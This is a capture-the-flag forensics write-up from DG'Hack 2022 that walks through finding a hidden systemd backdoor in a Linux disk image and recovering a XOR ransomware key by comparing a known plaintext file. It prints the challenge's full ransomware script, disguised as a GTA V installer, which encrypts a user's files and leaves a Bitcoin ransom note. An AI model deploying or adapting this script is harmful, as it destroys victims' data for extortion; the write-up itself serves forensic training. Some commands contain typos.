# DG'Hack 2022

> author : malon 

## Forensics

### Vivre pas cher - Cheap living

> Our server has been hacked. It's obvious.
>
> They expose our source code all the time, as soon as we update it.
>
> You need to find the source of this backdoor as soon as possible.
>
> Annie Massion, Postal Services



###### Initial step

We are provided with a disk image

> a **disk image** is an exact copy of a disk

```bash
ls
#cheap-life.img
```

Let's try to list the partition(s): 

```bash
fdisk -l cheap-life.img
```

> Disk cheap-life.img: 1 GiB, 1073741824 bytes, 2097152 sectors
> Units: sectors of 1 * 512 = 512 bytes
> Sector size (logical/physical): 512 bytes / 512 bytes
> I/O size (minimum/optimal): 512 bytes / 512 bytes
> Disklabel type: dos
> Disk identifier: 0x257c224f
>
> Device          Boot Start     End Sectors  Size Id Type
> cheap-life.img1 *     2048 2097151 2095104 1023M 83 Linux

> A **partition** is a section of a storage media

Now that we have all the information we need :

- size of sectors : 512 bytes
- start offset of a partition : 2048

We can mount the Linux partition we found

```bash
sudo mkdir /mnt/ez
sudo mount -o $((512*2048)) cheap-life.img /mnt/ez
```

(from now on I will give the commands being possitioned in /mnt/ez)

> **backdoor** : access kept secret from the legitimate user

To find this backdoor, I go through the different ways to apply persistence on linux systems : ssh connection, cron, service,...

###### Finding the backdoor among services

```bash
tree -a etc/systemd
```

![image-20221111172240570](/home/mallon/.config/Typora/typora-user-images/image-20221111172240570.png)

I look a little bit randomly at each of the files until I find an interesting one

```bash
cat etc/systemd/system/systembd.service
```

![image-20221111172352917](/home/mallon/.config/Typora/typora-user-images/image-20221111172352917.png)

so when you give "start_backdoor" as an option to groupdel, everything is normal?

It is likely that this groupdel is not the classic groupdel so we should decompile it

- focus on **main()**:

![image-20221111172509945](/home/mallon/.config/Typora/typora-user-images/image-20221111172509945.png)

We can see that if "start_backdoor" is given as argument, the start_backdoor function is called

- focus on **start_backdoor()**:

![image-20221111172532680](/home/mallon/.config/Typora/typora-user-images/image-20221111172532680.png)

there is indeed a start_backdoor function, but it comes from an external library

```bash
readelf -d usr/sbin/groupdel
```

![image-20221111172856523](/home/mallon/.config/Typora/typora-user-images/image-20221111172856523.png)

We now need to find the libsysd.so file

```bash
find . -name libsysd.so 
#./lib/libsysd.so
```

We can also analyze it with ghidra

- focus on **start_backdoor()**

![image-20221111173157204](/home/mallon/.config/Typora/typora-user-images/image-20221111173157204.png)

it seems like the flag get printed but it is base64 encoded

 ```bash
 echo -n "REdIQUNLe1N5c3RlbURJc0FGcmVuY2hFeHByZXNzaW9uQWJvdXRMaXZpbmdPdXRPZlJlc291cmNlZnVsbmVzc1dpd GhMaXR0bGVNb25leX0K" | base64 -d
 #DGHACK{**...}
 ```



### Not a good name - Pas Un Bon Nom

> I was just sitting there on my PC, m'kay? I'm downloading movies and stuff, mkay? And then there's this weird message that I have to pay Dogecoin to decrypt my data. I didn't do it... so now my data is encrypted :( So here, take the hard drive, it's not like it's useful now... Unless it was possible to find the key used by that evil hacker, m'kay? Would you like it? You'd be lovely thank you!

```bash
ls 
#pc-jeane.ova
```

ova -> virtualbox

once started, we now know that the OS is Lubuntu

```bash
ls
#Desktop    Downloads           Music     Public                          Templates
#Documents  GTA_V_installer.py  Pictures  READ_TO_RETRIEVE_YOUR_DATA.txt  Videos
```

The two files with capitalized names stand out, and indeed![image-20221111230502233](/home/mallon/.config/Typora/typora-user-images/image-20221111230502233.png)

It seems that the owner has downloaded a lot of stuff including a supra legit GTA-V.

*GTA_V_installer.py*

```python
#!/bin/python3

import os
import fileinput
import sys

main_folder = "./"

def encryptDecrypt(inpDataBytes):

    # Define XOR key
    keyLength = len(xorKey)
 
    # calculate length of input string
    length = len(inpDataBytes)
 
    # perform XOR operation of key
    # with every byte
    for i in range(length):
        inpDataBytes[i] = inpDataBytes[i] ^ ord(xorKey[i % keyLength])

    return inpDataBytes

if __name__ == '__main__':
    # list all the files in the main folder, and its subfolders
    #list_of_files = [main_folder + f for f in os.listdir(main_folder) if os.path.isfile(main_folder + f) and not f.startswith('.')]
    list_of_files = []
    for root, dirs, files in os.walk(main_folder):
        for file in files:
            if not '/.' in os.path.join(root, file):
                # get the file name
                list_of_files.append(os.path.join(root, file))
    print(list_of_files)
    print("\n")

    xorKey = input("Enter the key you received after following the instructions in READ_TO_RETRIEVE_YOUR_DATA.txt: ")

    for file in list_of_files:
        if "GTA_V_installer.py" not in file:
            with open(file, 'rb') as f:
                data = bytearray(f.read())
                print("data : " + str(data) + "\n")
                encrypted_data = encryptDecrypt(data)
                print("encrypted : " + str(encrypted_data) + "\n")
            with open(file, 'wb') as f:
                f.write(encrypted_data)

    # Create a READ_TO_RETRIEVE_YOUR_DATA.txt file
    with open(main_folder + "READ_TO_RETRIEVE_YOUR_DATA.txt", 'w') as f:
        f.write("Your PC is now encrypted.\nThe only way you may retrieve your data is by sending 1000 Bitcoins to the following address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n")
        f.write("Add a message to the Bitcoin transfer with your email address.\nThe code to decrypt your data will be sent automatically to this email.\n")
        f.write("Once you get this code, simply run \"python GTA_V_installer.py\" and input your code.\n")
        f.write("I'm very sorry for the inconvenience. I need to feed my family.\n")
        f.write("HODL.\n")

    # I replace the line where the key is defined, that way I can use the same script for decryption without leaving any trace of the key
    is_edited = False
    for line in fileinput.input("./GTA_V_installer.py", inplace=1):
        if "xorKey = " in line and not is_edited:
            line = "    xorKey = input(\"Enter the key you received after following the instructions in READ_TO_RETRIEVE_YOUR_DATA.txt: \")\n"
            is_edited = True
        sys.stdout.write(line)
```

All the non-hidden files present in /home/jeanne have been encrypted but fortunately, the encryption is simple, the files have just been XORied with a key.

reminder : 
$$
a \oplus b = c \newline
a \oplus c = b
$$
If we take a closer look at the list of encrypted files, we notice the 

- network.desktop
- trash-can.desktop
- user-home.desktop
- computer.desktop

These are the files that allow you to create shortcuts for launching applications from the desktop, by checking a little, I realize that they often have the same format, ( as long as there is no comment), but I decide to turn on a vm lubuntu that I had on hand to go and look for these files that have very strong chances to be the same

I get the two computer.desktop that I display both in hexa

![image-20221111233202365](/home/mallon/.config/Typora/typora-user-images/image-20221111233202365.png)

Given computer(1).desktop=A (original file) and computer.desktop=C (our encrypted file) 

if you want to find the encryption key for the xor operation, you just have to xor A and C (to obtain B)

![image-20221111233550094](/home/mallon/.config/Typora/typora-user-images/image-20221111233550094.png)

At a glance, the key quickly appears to us

```bash
REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=
```

But it looks like base64 encoded string so : 

```bash
echo -n "REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=" | base64d -d
#DGHACK{***...}
```

Here is our flag :)
